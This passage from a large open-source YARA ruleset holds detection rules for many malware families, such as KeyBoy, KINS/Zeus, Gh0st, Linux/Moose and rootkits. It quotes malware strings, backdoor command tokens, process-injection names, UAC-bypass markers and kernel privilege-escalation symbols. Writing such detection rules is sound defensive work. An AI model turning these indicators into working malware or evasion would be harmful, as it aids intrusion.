        IMulerCode or IMulerStrings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule apt_win32_dll_rat_1a53b0cp32e46g0qio7
{
	meta:
		author = "https://www.fidelissecurity.com/"
        	info = "Indicators for FTA-1020"
		hash1 = "75d3d1f23628122a64a2f1b7ef33f5cf"
		hash2 = "d9821468315ccd3b9ea03161566ef18e"
		hash3 = "b9af5f5fd434a65d7aa1b55f5441c90a"
		reference = "https://github.com/fideliscyber"
	strings:
    	// Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko
		$ = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59 00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00 39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22 00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00 c7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7 [2] 68 00 6e 00 c7 [2] 66 00 62 00 } // offset 10001566
	// Software\Microsoft\Windows\CurrentVersion\Run
       $ = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24 00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00 66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00 00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00 c7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 } // 10003D09
	$ = { 66 [4-7] 0d 40 83 f8 44 7c ?? }
       // xor		word ptr [ebp+eax*2+var_5C], 14h
	// inc		eax
	// cmp     	eax, 14h
       // Loop to decode a static string. It reveals the "1a53b0cp32e46g0qio9" static string sent in the beacon
	$ = { 66 [4-7] 14 40 83 f8 14 7c ?? } // 100017F0
	$ = { 66 [4-7] 56 40 83 f8 2d 7c ?? } // 10003621
	$ = { 66 [4-7] 20 40 83 f8 1a 7c ?? } // 10003640
	$ = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? } //  10003930
	$ = "%08x%08x%08x%08x" wide ascii
	$ = "WinHttpGetIEProxyConfigForCurrentUser" wide ascii

	condition:
	(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Insta11Code : Insta11 Family 
{
    meta:
        description = "Insta11 code features"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
    
    strings:
        // jmp $+5; push 423h
        $jumpandpush = { E9 00 00 00 00 68 23 04 00 00 }
    
    condition:
        any of them
}

rule Insta11Strings : Insta11 Family
{
    meta:
        description = "Insta11 Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
        
    strings:
        $ = "XTALKER7"
        $ = "Insta11 Microsoft" wide ascii
        $ = "wudMessage"
        $ = "ECD4FC4D-521C-11D0-B792-00A0C90312E1"
        $ = "B12AE898-D056-4378-A844-6D393FE37956"
        
    condition:
       any of them
}

rule Insta11 : Family
{
    meta:
        description = "Insta11"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
        
    condition:
        Insta11Code or Insta11Strings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Intel_Virtualization_Wizard_exe {
  meta:
    author = "cabrel@zerklabs.com"
    description = "Dynamic DLL abuse executable"

    file_1_seen = "2013-05-21"
    file_1_sha256 = "7787757ae851f4a162f46f794be1532ab78e1928185212bdab83b3106f28c708"

  strings:
    $a = {4C 6F 61 64 53 54 52 49 4E 47}
    $b = {49 6E 69 74 69 61 6C 69 7A 65 4B 65 79 48 6F 6F 6B}
    $c = {46 69 6E 64 52 65 73 6F 75 72 63 65 73}
    $d = {4C 6F 61 64 53 54 52 49 4E 47 46 72 6F 6D 48 4B 43 55}
    $e = {68 63 63 75 74 69 6C 73 2E 44 4C 4C}
  condition:
    all of them
}

rule Intel_Virtualization_Wizard_dll {
  meta:
    author = "cabrel@zerklabs.com"
    description = "Dynamic DLL (Malicious)"

    file_1_seen = "2013-05-21"
    file_1_sha256 = "485ae043b6a5758789f1d33766a26d8b45b9fde09cde0512aa32d4bd1ee04f28"

  strings:
    $a = {48 3A 5C 46 61 73 74 5C 50 6C 75 67 28 68 6B 63 6D 64 29 5C}
    $b = {64 6C 6C 5C 52 65 6C 65 61 73 65 5C 48 69 6A 61 63 6B 44 6C 6C 2E 70 64 62}

  condition:
    ($a and $b) and Intel_Virtualization_Wizard_exe
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"
rule jRAT_conf : rat 
{
	meta:
		description = "jRAT configuration" 
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-10-11"
		filetype = "memory"
		version = "1.0" 
		ref1 = "https://github.com/MalwareLu/config_extractor/blob/master/config_jRAT.py" 
		ref2 = "http://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html" 

	strings:
		$a = /port=[0-9]{1,5}SPLIT/ 

	condition: 
		$a
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule jjEncode
{
   meta:
      description = "jjencode detection"
      ref = "http://blog.xanda.org/2015/06/10/yara-rule-for-jjencode/"
      author = "adnan.shukor@gmail.com"
      date = "10-June-2015"
      version = "1"
      impact = 3
      hide = false
   strings:
      $jjencode = /(\$|[\S]+)=~\[\]\;(\$|[\S]+)\=\{[\_]{3}\:[\+]{2}(\$|[\S]+)\,[\$]{4}\:\(\!\[\]\+["]{2}\)[\S]+/ fullword 
   condition:
      $jjencode
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule KelihosHlux
{
  meta:
	author = "@malpush"
	maltype = "KelihosHlux"
	description = "http://malwared.ru"
	date = "22/02/2014"
  strings:
    $KelihosHlux_HexString = { 73 20 7D 8B FE 95 E4 12 4F 3F 99 3F 6E C8 28 26 C2 41 D9 8F C1 6A 72 A6 CE 36 0F 73 DD 2A 72 B0 CC D1 07 8B 2B 98 73 0E 7E 8C 07 DC 6C 71 63 F4 23 27 DD 17 56 AE AB 1E 30 52 E7 54 51 F7 20 ED C7 2D 4B 72 E0 77 8E B4 D2 A8 0D 8D 6A 64 F9 B7 7B 08 70 8D EF F3 9A 77 F6 0D 88 3A 8F BB C8 89 F5 F8 39 36 BA 0E CB 38 40 BF 39 73 F4 01 DC C1 17 BF C1 76 F6 84 8F BD 87 76 BC 7F 85 41 81 BD C6 3F BC 39 BD C0 89 47 3E 92 BD 80 60 9D 89 15 6A C6 B9 89 37 C4 FF 00 3D 45 38 09 CD 29 00 90 BB B6 38 FD 28 9C 01 39 0E F9 30 A9 66 6B 19 C9 F8 4C 3E B1 C7 CB 1B C9 3A 87 3E 8E 74 E7 71 D1 }
   
  condition:
    $KelihosHlux_HexString
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule KeyBoy_Dropper  
{  
    meta:
        Author      = "Rapid7 Labs"
        Date        = "2013/06/07"
        Description = "Strings inside"
        Reference   = "https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india"

    strings:
        $1 = "I am Admin"  
        $2 = "I am User"  
        $3 = "Run install success!"  
        $4 = "Service install success!"  
        $5 = "Something Error!"  
        $6 = "Not Configed, Exiting"  

    condition:  
        all of them  
}

rule KeyBoy_Backdoor  
{
    meta:
        Author      = "Rapid7 Labs"
        Date        = "2013/06/07"
        Description = "Strings inside"
        Reference   = "https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india"

    strings:  
        $1 = "$login$"  
        $2 = "$sysinfo$"  
        $3 = "$shell$"  
        $4 = "$fileManager$"  
        $5 = "$fileDownload$"  
        $6 = "$fileUpload$"  

    condition:  
        all of them  
} 
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"
rule KINS_dropper {
	meta:
		author = "AlienVault Labs aortega@alienvault.com"
		description = "Match protocol, process injects and windows exploit present in KINS dropper"
		reference = "http://goo.gl/arPhm3"
	strings:
		// Network protocol
		$n1 = "tid=%d&ta=%s-%x" fullword
		$n2 = "fid=%d" fullword
		$n3 = "%[^.].%[^(](%[^)])" fullword
		// Injects
		$i0 = "%s [%s %d] 77 %s"
		$i01 = "Global\\%s%x"
		$i1 = "Inject::InjectProcessByName()"
		$i2 = "Inject::CopyImageToProcess()"
		$i3 = "Inject::InjectProcess()"
		$i4 = "Inject::InjectImageToProcess()"
		$i5 = "Drop::InjectStartThread()"
		// UAC bypass
		$uac1 = "ExploitMS10_092"
		$uac2 = "\\globalroot\\systemroot\\system32\\tasks\\" ascii wide
		$uac3 = "<RunLevel>HighestAvailable</RunLevel>" ascii wide
	condition:
		2 of ($n*) and 2 of ($i*) and 2 of ($uac*)
}

rule KINS_DLL_zeus {
	meta:
		author = "AlienVault Labs aortega@alienvault.com"
		description = "Match default bot in KINS leaked dropper, Zeus"
		reference = "http://goo.gl/arPhm3"
	strings:
		// Network protocol
		$n1 = "%BOTID%" fullword
		$n2 = "%opensocks%" fullword
		$n3 = "%openvnc%" fullword
		$n4 = /Global\\(s|v)_ev/ fullword
		// Crypted strings
		$s1 = "\x72\x6E\x6D\x2C\x36\x7D\x76\x77"
		$s2 = "\x18\x04\x0F\x12\x16\x0A\x1E\x08\x5B\x11\x0F\x13"
		$s3 = "\x39\x1F\x01\x07\x15\x19\x1A\x33\x19\x0D\x1F"
		$s4 = "\x62\x6F\x71\x78\x63\x61\x7F\x69\x2D\x67\x79\x65"
		$s5 = "\x6F\x69\x7F\x6B\x61\x53\x6A\x7C\x73\x6F\x71"
	condition:
		all of ($n*) and 1 of ($s*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Kraken_Bot_Sample {
	meta:
		description = "Kraken Bot Sample - file inf.bin"
		author = "Florian Roth"
		reference = "https://blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html"
		date = "2015-05-07"
		hash = "798e9f43fc199269a3ec68980eb4d91eb195436d"
		score = 90
	strings:
		$s2 = "%s=?getname" fullword ascii
		$s4 = "&COMPUTER=^" fullword ascii
		$s5 = "xJWFwcGRhdGElAA=" fullword ascii /* base64 encoded string '%appdata%' */
		$s8 = "JVdJTkRJUi" fullword ascii /* base64 encoded string '%WINDIR' */
		$s20 = "btcplug" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

/* LENOVO Superfish -------------------------------------------------------- */

rule VisualDiscovery_Lonovo_Superfish_SSL_Hijack {
	meta:
		description = "Lenovo Superfish SSL Interceptor - file VisualDiscovery.exe"
		author = "Florian Roth / improved by kbandla"
		reference = "https://twitter.com/4nc4p/status/568325493558272000"
		date = "2015/02/19"
		hash1 = "99af9cfc7ab47f847103b5497b746407dc566963"
		hash2 = "f0b0cd0227ba302ac9ab4f30d837422c7ae66c46"
		hash3 = "f12edf2598d8f0732009c5cd1df5d2c559455a0b"
		hash4 = "343af97d47582c8150d63cbced601113b14fcca6"
	strings:
		$mz = { 4d 5a }
		//$s1 = "VisualDiscovery.exe" fullword wide
		$s2 = "Invalid key length used to initialize BlowFish." fullword ascii
		$s3 = "GetPCProxyHandler" fullword ascii
		$s4 = "StartPCProxy" fullword ascii
		$s5 = "SetPCProxyHandler" fullword ascii
	condition:
		( $mz at 0 ) and filesize < 2MB and all of ($s*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule leverage_a
{
	meta:
		author = "earada@alienvault.com"
		version = "1.0"
		description = "OSX/Leverage.A"
		date = "2013/09"
	strings:
		$a1 = "ioreg -l | grep \"IOPlatformSerialNumber\" | awk -F"
		$a2 = "+:Users:Shared:UserEvent.app:Contents:MacOS:"
		$a3 = "rm '/Users/Shared/UserEvent.app/Contents/Resources/UserEvent.icns'"
		$script1 = "osascript -e 'tell application \"System Events\" to get the hidden of every login item'"
		$script2 = "osascript -e 'tell application \"System Events\" to get the name of every login item'"
		$script3 = "osascript -e 'tell application \"System Events\" to get the path of every login item'"
		$properties = "serverVisible \x00"
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

// Linux/Moose yara rules
// For feedback or questions contact us at: github@eset.com
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2015, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//

private rule is_elf
{
    strings:
        $header = { 7F 45 4C 46 }

    condition:
        $header at 0
}

rule moose
{
    meta:
        Author      = "Thomas Dupuy"
        Date        = "2015/04/21"
        Description = "Linux/Moose malware"
        Reference   = "http://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s0 = "Status: OK"
        $s1 = "--scrypt"
        $s2 = "stratum+tcp://"
        $s3 = "cmd.so"
        $s4 = "/Challenge"
        $s7 = "processor"
        $s9 = "cpu model"
        $s21 = "password is wrong"
        $s22 = "password:"
        $s23 = "uthentication failed"
        $s24 = "sh"
        $s25 = "ps"
        $s26 = "echo -n -e "
        $s27 = "chmod"
        $s28 = "elan2"
        $s29 = "elan3"
        $s30 = "chmod: not found"
        $s31 = "cat /proc/cpuinfo"
        $s32 = "/proc/%s/cmdline"
        $s33 = "kill %s"

    condition:
        is_elf and all of them
}/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule lost_door : Trojan
{
	meta:
		author="Kevin Falcoz"
		date="23/02/2013"
		description="Lost Door"
	
	strings:
		$signature1={45 44 49 54 5F 53 45 52 56 45 52} /*EDIT_SERVER*/
		
	condition:
		$signature1
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule LuckyCatCode : LuckyCat Family 
{
    meta:
        description = "LuckyCat code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $xordecrypt = { BF 0F 00 00 00 F7 F7 ?? ?? ?? ?? 32 14 39 80 F2 7B }
        $dll = { C6 ?? ?? ?? 64 C6 ?? ?? ?? 6C C6 ?? ?? ?? 6C }
        $commonletters = { B? 63 B? 61 B? 73 B? 65 }
        
    condition:
        $xordecrypt or ($dll and $commonletters)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule LURK0Header : Family LURK0 {
	meta:
		description = "5 char code for LURK0"
		author = "Katie Kleemola"
		last_updated = "07-21-2014"
	
	strings:
		$ = { C6 [5] 4C C6 [5] 55 C6 [5] 52 C6 [5] 4B C6 [5] 30 }

	condition:
		any of them
}

rule CCTV0Header : Family CCTV0 {
        meta:  
		description = "5 char code for LURK0"
		author = "Katie Kleemola"
		last_updated = "07-21-2014"

	strings:
		//if its just one char a time
		$ = { C6 [5] 43 C6 [5] 43 C6 [5] 54 C6 [5] 56 C6 [5] 30 }
		// bit hacky but for when samples dont just simply mov 1 char at a time
		$ = { B0 43 88 [3] 88 [3] C6 [3] 54 C6 [3] 56 [0-12] (B0 30 | C6 [3] 30) }

	condition:
		any of them
}

rule SharedStrings : Family {
	meta:
		description = "Internal names found in LURK0/CCTV0 samples"
		author = "Katie Kleemola"
		last_updated = "07-22-2014"
	
	strings:
		// internal names
		$i1 = "Butterfly.dll"
		$i2 = /\\BT[0-9.]+\\ButterFlyDLL\\/
		$i3 = "ETClientDLL"

		// dbx
		$d1 = "\\DbxUpdateET\\" wide
		$d2 = "\\DbxUpdateBT\\" wide
		$d3 = "\\DbxUpdate\\" wide
		
		// other folders
		$mc1 = "\\Micet\\"

		// embedded file names
		$n1 = "IconCacheEt.dat" wide
		$n2 = "IconConfigEt.dat" wide

		$m1 = "\x00\x00ERXXXXXXX\x00\x00" wide
		$m2 = "\x00\x00111\x00\x00" wide
		$m3 = "\x00\x00ETUN\x00\x00" wide
		$m4 = "\x00\x00ER\x00\x00" wide

	condition:
		any of them //todo: finetune this

}

rule LURK0 : Family LURK0 {
	
	meta:
		description = "rule for lurk0"
		author = "Katie Kleemola"
		last_updated = "07-22-2014"

	condition:
		LURK0Header and SharedStrings

}


rule CCTV0 : Family CCTV0 {

	meta:
		description = "rule for cctv0"
		author = "Katie Kleemola"
		last_updated = "07-22-2014"

	condition:
		CCTV0Header and SharedStrings

}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule MacControlCode : MacControl Family 
{
    meta:
        description = "MacControl code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-17"
        
    strings:
        // Load these function strings 4 characters at a time. These check the first two blocks:
        $L4_Accept = { C7 ?? 41 63 63 65 C7 ?? 04 70 74 3A 20 }
        $L4_AcceptLang = { C7 ?? 41 63 63 65 C7 ?? 04 70 74 2D 4C }
        $L4_Pragma = { C7 ?? 50 72 61 67 C7 ?? 04 6D 61 3A 20 }
        $L4_Connection = { C7 ?? 43 6F 6E 6E C7 ?? 04 65 63 74 69 }
        $GEThgif = { C7 ?? 47 45 54 20 C7 ?? 04 2F 68 2E 67 }
        
    condition:
        all of ($L4*) or $GEThgif
}

rule MacControlStrings : MacControl Family
{
    meta:
        description = "MacControl Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-17"
        
    strings:
        $ = "HTTPHeadGet"
        $ = "/Libmalware_rary/launched"
        $ = "My connect error with no ip!"
        $ = "Send File is Failed"
        $ = "****************************You Have got it!****************************"
        
    condition:
        any of them
}

rule MacControl : Family
{
    meta:
        description = "MacControl"
        author = "Seth Hardy"
        last_modified = "2014-06-16"
        
    condition:
        MacControlCode or MacControlStrings
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
  Description: This rule keys on email headers that may have been sent from a malicious PHP script on a compromised webserver.
  Priority: 4
  Scope: Against Email
  Tags: None
  Author: P.Burbage
  Created in PhishMe's Triage on September 1, 2015 1:43 PM
*/

rule PM_Email_Sent_By_PHP_Script
{
  strings:
    $php1="X-PHP-Script" fullword
    $php2="X-PHP-Originating-Script" fullword
    $php3="/usr/bin/php" fullword

  condition:
    any of them
}

/*
  Description: Hits on ZIP attachments that contain *.js or *.jse - usually JS Dropper malware that has downloaded Kovter & Boaxee in the past.
  Priority: 5
  Scope: Against Attachment
  Tags: FileID
  Author: P.Burbage
  Created in PhishMe's Triage on September 1, 2015 1:43 PM
*/

rule PM_Zip_with_js
{
  strings:
    $hdr="PK" 
    $e1=".js" nocase
    $e2=".jse" nocase

  condition:
    $hdr at 0 and (($e1 in (filesize-100..filesize)) or ($e2 in (filesize-100..filesize)))
}


import "pe"


rule Trojan_W32_Gh0stMiancha_1_0_0
{
    meta:
        Author      = "Context Threat Intelligence"
        Date        = "2014/01/27"
        Description = "Bytes inside"
        Reference   = "http://www.contextis.com/documents/30/TA10009_20140127_-_CTI_Threat_Advisory_-_The_Monju_Incident1.pdf"

    strings:
        $0x = { 57 5b 5a 5a 51 57 40 34 31 67 2e 31 70 34 5c 40 40 44 3b 25 3a 19 1e 5c 7b 67 60 2e 34 31 67 2e 31 70 19 1e 55 77 77 71 64 60 2e 34 3e 3b 3e 19 1e 57 7b 7a 60 71 7a 60 39 40 6d 64 71 2e 34 60 71 6c 60 3b 7c 60 79 78 19 1e 44 66 7b 6c 6d 39 57 7b 7a 7a 71 77 60 7d 7b 7a 2e 34 5f 71 71 64 39 55 78 7d 62 71 19 1e 57 7b 7a 60 71 7a 60 39 78 71 7a 73 60 7c 2e 34 24 19 1e 19 1e }
        $1 = { 5c e7 99 bd e5 8a a0 e9 bb 91 5c }
        $1x = { 48 f3 8d a9 f1 9e b4 fd af 85 48 }
        $2 = "DllCanLoadNow"
        $2x = { 50 78 78 57 75 7a 58 7b 75 70 5a 7b 63 }
        $3x = { 5a 61 79 76 71 66 34 7b 72 34 67 61 76 7f 71 6d 67 2e 34 31 70 } 
        $4 = "JXNcc2hlbGxcb3Blblxjb21tYW5k"
        $4x = { 5e 4c 5a 77 77 26 7c 78 76 53 6c 77 76 27 56 78 76 78 6c 7e 76 26 25 60 4d 43 21 7f }
        $5 = "SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA=="
        $5x = { 47 51 52 47 46 52 70 56 41 7f 42 77 46 51 42 40 45 25 5e 5e 41 52 46 5e 40 24 21 77 41 27 78 6e 70 53 42 60 4c 51 5a 78 76 7a 46 6d 4d 43 6c 45 77 79 2d 7e 4e 4c 5a 6e 76 27 5e 77 59 55 29 29 }
        $6 = "C:\\Users\\why\\"
        $6x = { 57 2e 48 41 67 71 66 67 48 63 7c 6d 48 }
        $7 = "g:\\ykcx\\"
        $7x = { 73 2E 48 6D 7F 77 6C 48 }
        $8 = "(miansha)"
        $8x = { 3C 79 7D 75 7A 67 7C 75 3D }
        $9 = "server(\xE5\xA3\xB3)"
        $9x = { 7C 2E 48 26 24 25 27 3A 25 25 3A 26 21 48 67 71 66 62 71 66 3C F1 B7 A7 3D 48 46 71 78 71 75 67 71 48 67 71 66 62 71 66 3A 64 70 76 }
        $cfgDecode = { 8a ?? ?? 80 c2 7a 80 f2 19 88 ?? ?? 41 3b ce 7c ??}

   condition:
       any of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule LinuxAESDDoS
{
    meta:
	Author = "@benkow_"
	Date = "2014/09/12"
	Description = "Strings inside"
        Reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"

    strings:
        $a = "3AES"
        $b = "Hacker"
        $c = "VERSONEX"

    condition:
        2 of them
}

rule LinuxBillGates 
{
    meta:
       Author      = "@benkow_"
       Date        = "2014/08/11" 
       Description = "Strings inside"
       Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3429" 

    strings:
        $a= "12CUpdateGates"
        $b= "11CUpdateBill"

    condition:
        $a and $b
}

rule LinuxElknot
{
    meta:
	Author      = "@benkow_"
        Date        = "2013/12/24" 
        Description = "Strings inside"
        Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3099"

    strings:
        $a = "ZN8CUtility7DeCryptEPciPKci"
	$b = "ZN13CThreadAttack5StartEP11CCmdMessage"

    condition:
	all of them
}

rule LinuxMrBlack
{
    meta:
	Author      = "@benkow_"
        Date        = "2014/09/12" 
        Description = "Strings inside"
        Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"

    strings:
        $a = "Mr.Black"
	$b = "VERS0NEX:%s|%d|%d|%s"
    condition:
        $a and $b
}

rule LinuxTsunami
{
    meta:
	
		Author      = "@benkow_"
		Date        = "2014/09/12" 
		Description = "Strings inside"
		Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"

    strings:
        $a = "PRIVMSG %s :[STD]Hitting %s"
        $b = "NOTICE %s :TSUNAMI <target> <secs>"
        $c = "NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually."
    condition:
        $a or $b or $c
}

rule rootkit
{
	meta:
                author="xorseed"
                reference= "https://stuff.rop.io/"
	strings:
		$sys1 = "sys_write" nocase ascii wide	
		$sys2 = "sys_getdents" nocase ascii wide
		$sys3 = "sys_getdents64" nocase ascii wide
		$sys4 = "sys_getpgid" nocase ascii wide
		$sys5 = "sys_getsid" nocase ascii wide
		$sys6 = "sys_setpgid" nocase ascii wide
		$sys7 = "sys_kill" nocase ascii wide
		$sys8 = "sys_tgkill" nocase ascii wide
		$sys9 = "sys_tkill" nocase ascii wide
		$sys10 = "sys_sched_setscheduler" nocase ascii wide
		$sys11 = "sys_sched_setparam" nocase ascii wide
		$sys12 = "sys_sched_getscheduler" nocase ascii wide
		$sys13 = "sys_sched_getparam" nocase ascii wide
		$sys14 = "sys_sched_setaffinity" nocase ascii wide
		$sys15 = "sys_sched_getaffinity" nocase ascii wide
		$sys16 = "sys_sched_rr_get_interval" nocase ascii wide
		$sys17 = "sys_wait4" nocase ascii wide
		$sys18 = "sys_waitid" nocase ascii wide
		$sys19 = "sys_rt_tgsigqueueinfo" nocase ascii wide
		$sys20 = "sys_rt_sigqueueinfo" nocase ascii wide
		$sys21 = "sys_prlimit64" nocase ascii wide
		$sys22 = "sys_ptrace" nocase ascii wide
		$sys23 = "sys_migrate_pages" nocase ascii wide
		$sys24 = "sys_move_pages" nocase ascii wide
		$sys25 = "sys_get_robust_list" nocase ascii wide
		$sys26 = "sys_perf_event_open" nocase ascii wide
		$sys27 = "sys_uname" nocase ascii wide
		$sys28 = "sys_unlink" nocase ascii wide
		$sys29 = "sys_unlikat" nocase ascii wide
		$sys30 = "sys_rename" nocase ascii wide
		$sys31 = "sys_read" nocase ascii wide
		$sys32 = "kobject_del" nocase ascii wide
		$sys33 = "list_del_init" nocase ascii wide
		$sys34 = "inet_ioctl" nocase ascii wide
	condition:
		9 of them
}

rule exploit
{
        meta:
                author="xorseed"
                reference= "https://stuff.rop.io/"
	strings:
		$xpl1 = "set_fs_root" nocase ascii wide
		$xpl2 = "set_fs_pwd" nocase ascii wide
		$xpl3 = "__virt_addr_valid" nocase ascii wide
		$xpl4 = "init_task" nocase ascii wide
		$xpl5 = "init_fs" nocase ascii wide
		$xpl6 = "bad_file_ops" nocase ascii wide
		$xpl7 = "bad_file_aio_read" nocase ascii wide
		$xpl8 = "security_ops" nocase ascii wide
		$xpl9 = "default_security_ops" nocase ascii wide
		$xpl10 = "audit_enabled" nocase ascii wide
		$xpl11 = "commit_creds" nocase ascii wide
		$xpl12 = "prepare_kernel_cred" nocase ascii wide
		$xpl13 = "ptmx_fops" nocase ascii wide
		$xpl14 = "node_states" nocase ascii wide
	condition:
		7 of them
}

rule ldpreload
{
        meta:
                author="xorseed"
                reference= "https://stuff.rop.io/"
	strings:
		$a = "dlopen" nocase ascii wide
		$b = "dlsym" nocase ascii wide
		$c = "fopen" nocase ascii wide
		$d = "fopen64" nocase ascii wide
		$e = "__fxstat" nocase ascii wide
